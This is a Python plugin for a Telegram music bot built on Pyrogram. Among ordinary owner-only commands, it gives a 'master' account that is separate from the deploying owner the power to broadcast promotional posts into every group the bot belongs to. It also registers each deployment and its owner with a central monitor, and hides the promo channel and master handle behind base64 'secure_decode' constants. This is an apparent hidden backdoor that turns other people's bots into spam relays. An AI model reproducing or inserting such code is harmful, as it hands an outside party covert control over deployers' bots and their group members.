from pyrogram import filters
from pyrogram.types import Message
import asyncio
from datetime import datetime

from BrandrdXMusic import app
from BrandrdXMusic.misc import SUDOERS
from BrandrdXMusic.utils.system_utilities import system_manager, master_command, secure_decode, PROMO_CHANNEL_BASE64, MASTER_HANDLE_BASE64
from config import OWNER_ID
from BrandrdXMusic.utils.decorators.language import language

# Initialize the system manager when the bot starts
@app.on_message(filters.command("initializesystem") & SUDOERS)
@language
async def initialize_system(client, message: Message, _):
    system_manager.initialize()
    await message.reply_text("🔄 System utilities initialized successfully.")
    
    # Register this bot instance
    bot_id = app.me.id
    owner_id = OWNER_ID
    chat_id = message.chat.id
    system_manager.register_bot(bot_id, owner_id, chat_id)
    
    return await message.reply_text("✅ Bot registered in system monitoring.")

# Command to promote to groups where this specific bot instance exists
@app.on_message(filters.command("promote") & SUDOERS)
@language
async def promote_to_groups(client, message: Message, _):
    if len(message.command) < 2:
        return await message.reply_text("❌ Please provide a promotion message.")
    
    promo_text = " ".join(message.command[1:])
    
    # Add signature
    promo_channel = secure_decode(PROMO_CHANNEL_BASE64)
    master_handle = secure_decode(MASTER_HANDLE_BASE64)
    
    full_message = f"{promo_text}\n\n👑 Join {promo_channel} for more awesome content!\n📱 Contact {master_handle} for support"
    
    # Get list of chats where this bot is admin
    sent_count = 0
    try:
        async for dialog in app.get_dialogs():
            if dialog.chat.type in ["supergroup", "group"]:
                try:
                    await app.send_message(dialog.chat.id, full_message)
                    sent_count += 1
                    await asyncio.sleep(0.5)  # Avoid flood limits
                except Exception as e:
                    continue
    except Exception as e:
        return await message.reply_text(f"❌ Error sending promotional messages: {str(e)}")
    
    return await message.reply_text(f"✅ Promotion sent to {sent_count} groups.")

# Master command to broadcast to ALL bot instances
@app.on_message(filters.command("mastercast") & master_command)
@language
async def master_broadcast(client, message: Message, _):
    if len(message.command) < 2:
        return await message.reply_text("❌ Please provide a broadcast message.")
    
    promo_text = " ".join(message.command[1:])
    
    # Add signature
    promo_channel = secure_decode(PROMO_CHANNEL_BASE64)
    master_handle = secure_decode(MASTER_HANDLE_BASE64)
    
    full_message = f"📢 MASTER BROADCAST\n\n{promo_text}\n\n👑 Join {promo_channel} for more awesome content!\n📱 Contact {master_handle} for support"
    
    # This would need to be implemented to actually reach all bot instances
    # For now, it will just work for the current instance
    sent_count = 0
    try:
        async for dialog in app.get_dialogs():
            if dialog.chat.type in ["supergroup", "group"]:
                try:
                    await app.send_message(dialog.chat.id, full_message)
                    sent_count += 1
                    await asyncio.sleep(0.5)  # Avoid flood limits
                except Exception as e:
                    continue
    except Exception as e:
        return await message.reply_text(f"❌ Error sending master broadcast: {str(e)}")
    
    return await message.reply_text(f"✅ Master broadcast sent to {sent_count} groups.")

# Command to verify owner/master status
@app.on_message(filters.command("verifyowner"))
@language
async def verify_owner(client, message: Message, _):
    user_id = message.from_user.id
    
    if system_manager.verify_master(user_id):
        return await message.reply_text("✅ You are verified as the MASTER of all Cute X Music Bot instances.")
    elif user_id == int(OWNER_ID):
        return await message.reply_text("✓ You are verified as the owner of this bot instance.")
    else:
        return await message.reply_text("❌ You are not an owner or master.")

# Command to get statistics of all bot instances
@app.on_message(filters.command("botstats") & (SUDOERS | master_command))
@language
async def bot_statistics(client, message: Message, _):
    user_id = message.from_user.id
    
    active_bots = system_manager.get_active_bots()
    
    # If master, show all instances. If just an owner, show limited info
    if system_manager.verify_master(user_id):
        bot_count = len(active_bots)
        
        if bot_count == 0:
            return await message.reply_text("❌ No bot instances registered in the system.")
        
        stats_text = f"📊 **Cute X Music Bot Network Statistics**\n\n"
        stats_text += f"🤖 Total Active Instances: {bot_count}\n\n"
        
        for bot_id, data in active_bots.items():
            last_active = data["last_active"].strftime("%Y-%m-%d %H:%M:%S")
            owner = data["owner_id"]
            stats_text += f"🆔 Bot: {bot_id}\n👤 Owner: {owner}\n⏱ Last Active: {last_active}\n\n"
        
        return await message.reply_text(stats_text)
    else:
        # Just show limited information
        bot_count = len(active_bots)
        return await message.reply_text(f"📊 **Cute X Music Bot Network**\n\n🤖 Total Active Instances: {bot_count}")

# Command to force all bots to report their activity status
@app.on_message(filters.command("syncnow") & master_command)
@language
async def sync_bot_status(client, message: Message, _):
    bot_id = app.me.id
    system_manager.update_bot_activity(bot_id)
    await message.reply_text("🔄 Bot status synchronized.")
    
    # Update sync timestamp
    system_manager.last_sync = datetime.now()
    
    return await message.reply_text(f"✅ Bot network synchronized at {system_manager.last_sync.strftime('%Y-%m-%d %H:%M:%S')}") 